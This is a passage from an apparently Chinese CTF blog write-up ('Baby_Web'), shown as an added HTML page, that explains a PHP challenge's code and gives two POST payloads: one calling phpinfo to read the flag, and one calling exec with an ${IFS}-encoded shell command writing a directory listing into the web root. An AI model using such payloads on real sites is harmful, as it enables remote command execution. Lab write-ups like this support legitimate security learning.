&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>根据上面我们知道了一个新的路径&#x2F;template&#x2F;admin，访问一下看看</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164359542.png" srcset="/img/loading.gif" lazyload alt="image-20221206164359542"></p>
+<p>可以看见这里又调用了listdata方法</p>
+<p>根据目前所得到的信息，也能猜到，这是让我们要进入&#x2F;template&#x2F;admin这个路径里调用listdata方法</p>
+<hr>
+<p><strong>那么思路就来了，首先，post传参通过变量覆盖将space赋值成admin,get传参通过filename赋值成index.html，这样就可以进入&#x2F;template&#x2F;admin&#x2F;index.html这个路径了</strong></p>
+<hr>
+<p>接着我们再看listdata方法里都有什么东西</p>
+<p>$system这个数组可以省略不看，我只说几个稍微关键一点的地方</p>
+<p>这里的判断，我们是需要绕过的，$params[0]不能等于function，$params[0]这个位置我们需要它等于mod,所以这里我们待会可以随意传入一个值进去</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164407656.png" srcset="/img/loading.gif" lazyload alt="image-20221206164407656"></p>
+<p>这里是遍历新的数组</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164414361.png" srcset="/img/loading.gif" lazyload alt="image-20221206164414361"></p>
+<p>下面来到了关键的环节</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;function&#x27;</span>:<br><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">return</span>  <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>                &#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hacker!!&#x27;</span>;<br>                &#125;<br><br>                <span class="hljs-variable">$force</span> = <span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;force&#x27;</span>];<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$force</span>) &#123;<br>                    <span class="hljs-variable">$p</span> = [];<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$param</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span> =&gt; <span class="hljs-variable">$t</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$var</span>, <span class="hljs-string">&#x27;param&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-variable">$n</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$var</span>, <span class="hljs-number">5</span>));<br>                            <span class="hljs-variable">$p</span>[<span class="hljs-variable">$n</span>] = <span class="hljs-variable">$t</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span>) &#123;<br><br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$p</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$rt</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$rt</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;list&#x27;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$this</span>-&gt;date);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure>
+
+<p>$system[‘action’]里的值是function就会进入下面的判断</p>
+<p>name值不能为空，name传进去的函数如果是已定义的，会返回true，然后就可以绕过了</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164423863.png" srcset="/img/loading.gif" lazyload alt="image-20221206164423863"></p>
+<p>再往下面走</p>
+<p>判断$param[‘force’]必须要什么值都没有，不过$param数组里没有force这个键，所以直接也就进去了，foreach遍历param数组，判断键里面有没有param，没有，所以这个循环也没啥用。再往下走，判断p，如果有值，调用call_user_func_array，如果没有值调用call_user_func</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164429596.png" srcset="/img/loading.gif" lazyload alt="image-20221206164429596"></p>
+<p>一共两种方法，我们一一介绍一下</p>
+<p>第一种</p>
+<hr>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">get: filename=index.html<br>post: space=admin&amp;mod=<span class="hljs-number">12345</span> action=<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>=<span class="hljs-title">phpinfo</span></span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164438293.png" srcset="/img/loading.gif" lazyload alt="image-20221206164438293"></p>
+<p>然后在phpinfo里找到了flag</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164443698.png" srcset="/img/loading.gif" lazyload alt="image-20221206164443698"></p>
+<p>第二种</p>
+<p>根据上面的phpinfo里面的disable_functions可以发现exec并没有被禁用<br>那么这一次我们需要在p赋值的那里进行一下改变了，name要等于exec，再新添加一个param等于我们要执行的命令</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164450335.png" srcset="/img/loading.gif" lazyload alt="image-20221206164450335"></p>
+<p>（这里循环解释一下，$param数组里如果找到param这个键便能进行下面的给p数组赋值的环节，$n什么也没有，关键的地方就是在于因为有了新的传参，有了param，所以param也就会被传入$p里）</p>
+<p>下面开始构造payload，但是要主要的是，之前分割数组的时候，是以空格进行分割的，所以待会我们需要使用${IFS}进行绕过</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164455952.png" srcset="/img/loading.gif" lazyload alt="image-20221206164455952"></p>
+<hr>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">get:  filename=index.html<br>post: space=admin&amp;mode=<span class="hljs-number">2134</span> action=<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>=<span class="hljs-title">exec</span> <span class="hljs-title">param</span>=<span class="hljs-title">ls</span>$</span>&#123;IFS&#125;/&gt;/<span class="hljs-keyword">var</span>/www/html/a<br></code></pre></td></tr></table></figure>
+
+<hr>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164502176.png" srcset="/img/loading.gif" lazyload alt="image-20221206164502176"></p>
+<p><img src="/2022/12/06/BabyWeb/Users\林白\Desktop\md\img\image-20221206160100569.png" srcset="/img/loading.gif" lazyload alt="image-20221206160100569"></p>
+<p>查看根目录</p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164530756.png" srcset="/img/loading.gif" lazyload alt="image-20221206164530756"></p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164512507.png" srcset="/img/loading.gif" lazyload alt="image-20221206164512507"></p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164540320.png" srcset="/img/loading.gif" lazyload alt="image-20221206164540320"></p>
+<p><img src="/2022/12/06/BabyWeb/image-20221206164545355.png" srcset="/img/loading.gif" lazyload alt="image-20221206164545355"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Baby_Web</div>
+      <div>http://example.com/2022/12/06/BabyWeb/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Ten</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年12月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    
+      <script type="text/javascript">
+        var disqus_config = function() {
+          this.page.url = 'http://example.com/2022/12/06/BabyWeb/';
+          this.page.identifier = '/2022/12/06/BabyWeb/';
+        };
+        Fluid.utils.loadComments('#disqus_thread', function() {
+          var d = document, s = d.createElement('script');
+          s.src = '//' + 'fluid' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        });
+      </script>
+    
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '2s');
+    arr[i].setAttribute('data-wow-delay', '1s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '2');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --></body>
+</html>
